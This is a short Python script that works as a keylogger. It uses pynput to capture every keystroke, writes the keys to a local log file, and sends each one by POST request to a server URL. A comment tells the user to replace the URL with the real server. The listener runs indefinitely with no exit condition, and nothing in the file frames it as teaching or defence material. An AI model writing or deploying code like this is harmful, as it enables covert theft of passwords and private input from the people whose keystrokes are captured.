from pynput.keyboard import Key, Listener
import logging
import requests
import time

# Local log file configuration
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

server_url = "http://127.0.0.1:80/keylog"  # Ensure this is correct
# Replace with the actual URL of your server


# Function to send key logs to a remote server
def send_to_server(data):
    try:
        # Send a POST request with the keystroke data
        requests.post(server_url, data={'key': data})
    except requests.RequestException as e:
        # Log error if server is unreachable or any request error occurs
        logging.error(f"Failed to send data to server: {e}")


# Function to log the keys pressed locally and send to the server
def on_press(key):
    try:
        # Log regular alphanumeric keys
        log_entry = f"Key pressed: {key.char}"
    except AttributeError:
        # Handle special keys (shift, enter, etc.)
        log_entry = f"Special key pressed: {key}"

    # Log locally
    logging.info(log_entry)

    # Send to server
    send_to_server(log_entry)


# Start listening to keyboard events indefinitely
with Listener(on_press=on_press) as listener:
    listener.join()  # This keeps the listener active without a local exit condition